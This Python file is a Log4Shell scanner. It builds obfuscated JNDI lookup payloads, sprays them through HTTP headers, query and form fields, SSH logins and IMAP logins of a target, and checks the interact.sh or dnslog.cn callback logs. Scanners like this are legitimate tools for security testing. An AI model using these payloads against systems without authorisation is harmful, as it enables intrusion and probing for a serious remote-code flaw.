import argparse
import asyncio
import base64
import json
import logging
import random
import string
import uuid
from enum import Enum
from time import sleep
from urllib.parse import urlparse

import httpx
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from paramiko import SSHClient
from paramiko.client import WarningPolicy
from paramiko.ssh_exception import SSHException
from imap_tools import MailBox


class Dnslog:
    def __init__(self):
        self._client = httpx.Client()
        req = self._client.get("http://www.dnslog.cn/getdomain.php", timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self._client.get("http://www.dnslog.cn/getrecords.php", timeout=30)
        return req.json()


class Interactsh:
    # Source: https://github.com/fullhunt/log4j-scan/blob/7be0f1c02ce3494469dc73a177e6f0c96f0016d9/log4j-scan.py#L163
    def __init__(self, token="", server=""):
        # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server.lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid.uuid4())
        self.encoded = base64.b64encode(self.public_key).decode("utf8")
        guid = uuid.uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.client = httpx.Client()
        self.client.headers = self.headers
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.client.post(
            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise Exception("Can not initiate interact.sh DNS callback client")

    def pull_logs(self):
        result = []
        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.client.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        blocksize = AES.block_size
        initialisation_vector = decode[:blocksize]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=initialisation_vector, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.domain}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry


PROTOCOLS = [
    "dns", "ldap", "ldaps", "rmi",
]

OBFUSCATIONS = [
    r"[CHAR]", r"${::-[CHAR]}", r"${lower:[CHAR]}", r"${upper:[CHAR]}"
]

HEADERS = [
    "Referer",
    "X-Api-Version",
    "Accept",
    "User-Agent",
    "X-Forwarded-For",
    "Origin",
    "Cookie",
    "Accept-Encoding",
    "Accept-Language",
]

POST_BODY = {
    'username': "[PAYLOAD]",
    'user': "[PAYLOAD]",
    'email': "[PAYLOAD]",
    'account': "[PAYLOAD]",
    'password': "[PAYLOAD]",
    'name': "[PAYLOAD]",
    'message': "[PAYLOAD]"
}

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
}

LOG_LEVELS = {
    "debug": logging.DEBUG,
    "info": logging.INFO,
    "error": logging.ERROR,
}


class BaseScanner:
    obfuscate_payloads = True
    request_path = None

    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
        self.obfuscate_payloads = obfuscate_payloads
        self.request_path = request_path

    def _obfuscate_string(self, to_obfuscate: str) -> str:
        out = []
        for char in to_obfuscate:
            obfuscation: str = random.choice(OBFUSCATIONS)
            if "${" in obfuscation and "${::" not in obfuscation:
                obfuscation = obfuscation.replace("[CHAR]", random.choice(OBFUSCATIONS))
            out.append(obfuscation.replace("[CHAR]", char))
        return "".join(out)

    def create_payload(self, callback_url: str, protocol: str, test_path: str, test_domain: str = None, include_domain: bool = True) -> str:
        format_str = "${{{jndi}:{protocol}://{target_callback}/{path}}}"

        if include_domain:
            target = f"{test_domain}.{callback_url}"
        else:
            target = callback_url
        return format_str.format(
            jndi=(self._obfuscate_string("jndi") if self.obfuscate_payloads else "jndi"),
            protocol=(self._obfuscate_string(protocol) if self.obfuscate_payloads else protocol),
            target_callback=target,
            path=test_path
        )

    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
        raise NotImplementedError("Use a subclass to run tests.")


class HttpScanner(BaseScanner):
    proxy = None

    class InjectionPointType(Enum):
        Header = "header"
        GetParam = "get"
        PostParam = "post"

    def __init__(self, obfuscate_payloads: bool, request_path: str, proxy: str) -> None:
        super().__init__(obfuscate_payloads, request_path)
        self.proxy = proxy

    async def send_requests(self, client: httpx.AsyncClient, url: str, headers: dict, get_params: dict, post_params: dict) -> None:
        opened_requests = []
        try:
            if get_params or headers != DEFAULT_HEADERS:
                logging.debug("Sending GET")
                opened_requests.append(
                    client.get(
                        url,
                        params=get_params,
                        headers=headers,
                        timeout=3,
                    )
                )
                if get_params:
                    query_string = '&'.join(
                        [
                            f"{key}={value}" for key, value in get_params.items()
                        ]
                    )
                    opened_requests.append(
                        client.get(
                            f"{url}?{query_string}",
                            headers=headers,
                            timeout=3,
                        )
                    )
            if post_params or headers != DEFAULT_HEADERS:
                logging.debug("Sending POST as Form")
                opened_requests.append(
                    client.post(
                        url,
                        params=get_params,
                        headers=headers,
                        data=post_params,
                        timeout=3,
                    )
                )
                logging.debug("Sending POST as JSON")
                opened_requests.append(
                    client.post(
                        url,
                        params=get_params,
                        headers=headers,
                        json=post_params,
                        timeout=3,
                    ),
                )
        except Exception as excep:
            logging.exception(excep)
        for request in opened_requests:
            try:
                resp: httpx.Response = await request
                logging.debug(f"{resp.status_code}: {resp.reason_phrase}")
            except httpx.ConnectTimeout:
                pass
            except Exception as excep:
                logging.exception(excep)

    async def test_injection_point(self, injection_type: InjectionPointType, callback_host: str, url: str, is_domain_in_callback: bool = True, choose_random_path: bool = True, test_path: str = None):
        logging.info(f"Testing injection in {injection_type.value} with {callback_host} for {url}")
        if choose_random_path:
            target_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
        else:
            target_path = test_path

        for protocol in PROTOCOLS:
            logging.info(f"Testing the {protocol} protocol handler.")
            payload = self.create_payload(
                callback_host, protocol,
                target_path, urlparse(url).netloc,
                is_domain_in_callback
            )
            logging.debug(f"Using payload: {payload}")
            if injection_type == self.InjectionPointType.GetParam:
                params = {
                    "q": payload,
                    "t": payload.replace("{", r"%7B").replace("}", r"%7D")
                }
            else:
                params = None
            if injection_type == self.InjectionPointType.PostParam:
                data = POST_BODY.copy()
                for key in data.keys():
                    data[key] = data[key].replace("[PAYLOAD]", payload)
            else:
                data = None
            if injection_type == self.InjectionPointType.Header:
                headers_to_inject = [
                    {header_name: f'"{payload}"' if "Cookie" != header_name else f'session="{payload}"'} for header_name in HEADERS
                ]
            else:
                headers_to_inject = [DEFAULT_HEADERS.copy()]

            for header in headers_to_inject:
                headers = DEFAULT_HEADERS.copy()
                headers.update(header)
                # logging.debug(f"Sending request with headers: {headers}")
                async with httpx.AsyncClient(
                    verify=False,
                    proxies=self.proxy,
                    follow_redirects=True,
                    max_redirects=3
                ) as client:
                    await self.send_requests(client, url, headers, params, data)

    async def test_all_injection_points(self, url: str, callback: str, domain_in_callback: bool = True, has_random_request_path: bool = True):
        for injection_type in self.InjectionPointType:
            try:
                await self.test_injection_point(injection_type, callback, url, domain_in_callback, has_random_request_path, self.request_path)
            except Exception as excep:
                logging.exception(str(excep))

    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
        asyncio.run(
            self.test_all_injection_points(
                target, callback_domain, not no_payload_domain, use_random_request_path
            )
        )


class SshScanner(BaseScanner):

    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
        super().__init__(obfuscate_payloads, request_path)
        self._client = SSHClient()
        self._client.set_missing_host_key_policy(WarningPolicy)

    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
        if ":" in target:
            hostname, port = target.split(':')
        else:
            hostname = target
            port = 22
        logging.debug(f"Checking {hostname} on port {port} over SSH.")
        for protocol in PROTOCOLS:
            payload = self.create_payload(
                callback_domain, protocol,
                self.request_path, target,
                not no_payload_domain
            )
            try:
                self._client.connect(hostname=hostname, port=port, username=payload, password=payload, timeout=3, look_for_keys=False, auth_timeout=2)
                self._client.close()
            except SSHException as e:
                logging.exception(e)


class ImapScanner(BaseScanner):

    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
        super().__init__(obfuscate_payloads, request_path)

    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
        if ":" in target:
            hostname, port = target.split(':')
        else:
            hostname = target
            port = 993
        logging.debug(f"Checking {hostname} on port {port} over IMAP.")
        for protocol in PROTOCOLS:
            payload = self.create_payload(
                callback_domain, protocol,
                self.request_path, target,
                not no_payload_domain
            )
            try:
                mailbox = MailBox(hostname, port=port)
                mailbox.login(payload, payload, initial_folder=payload)
                mailbox.logout()
            except Exception as e:
                logging.exception(e)


class SmtpScanner(BaseScanner):

    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
        super().__init__(obfuscate_payloads, request_path)


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser("A scanner to check for the log4j vulnerability")

    parser.add_argument('-p', '--protocol', help="which protocol to test", choices=["http", "ssh"], default="http", type=str)
    parser.add_argument('-t', '--target', help="The target to check", type=str, required=True)
    parser.add_argument('-o', '--obfuscate', help="Whether payloads should be obfuscated or not", default=False, action="store_true")
    parser.add_argument('--no-payload-domain', help="Whether the original domain should be removed from the payload", default=False, action="store_true")
    parser.add_argument('--request-path', help="A custom path to add to the requests", type=str, default=None, action="store")
    parser.add_argument('-l', '--log-level', help="How detailed logging should be.", choices=LOG_LEVELS.keys(), default="error")

    http_opts = parser.add_argument_group()
    http_opts.add_argument('--proxy', help="A proxy URL", type=str, default=None)

    callback_group = parser.add_mutually_exclusive_group()
    callback_group.add_argument('--dns-callback', help="Which built-in DNS callback to use", type=str, choices=["interact.sh", "dnslog.cn"], default="interact.sh")
    callback_group.add_argument('--custom-callback', help="A different callback to use. Won't be checked by the application.", type=str, default=None)

    return parser.parse_args()


def main():
    arguments = parse_arguments()
    logging.basicConfig(
        level=LOG_LEVELS[arguments.log_level],
        format='[%(asctime)s] {%(filename)s:%(lineno)d} - %(levelname)s - %(message)s'
    )
    logging.debug(f"Got arguments {arguments}.")
    if arguments.proxy:
        global proxy
        proxy = arguments.proxy

    use_random_request_path = True
    if arguments.request_path:
        use_random_request_path = False

    dns_callback = None
    if arguments.custom_callback:
        callback_domain = arguments.custom_callback
    else:
        if arguments.dns_callback == "interact.sh":
            dns_callback = Interactsh()
        else:
            dns_callback = Dnslog()
        callback_domain = dns_callback.domain

    if arguments.protocol == "http":
        scanner = HttpScanner(arguments.obfuscate, arguments.request_path, arguments.proxy)
    elif arguments.protocol == "ssh":
        scanner = SshScanner(arguments.obfuscate, arguments.request_path)

    scanner.run_tests(
        arguments.target, callback_domain, not arguments.no_payload_domain, use_random_request_path
    )

    if not dns_callback:
        return

    sleep(10)
    records = dns_callback.pull_logs()
    print(records)


if __name__ == "__main__":
    main()
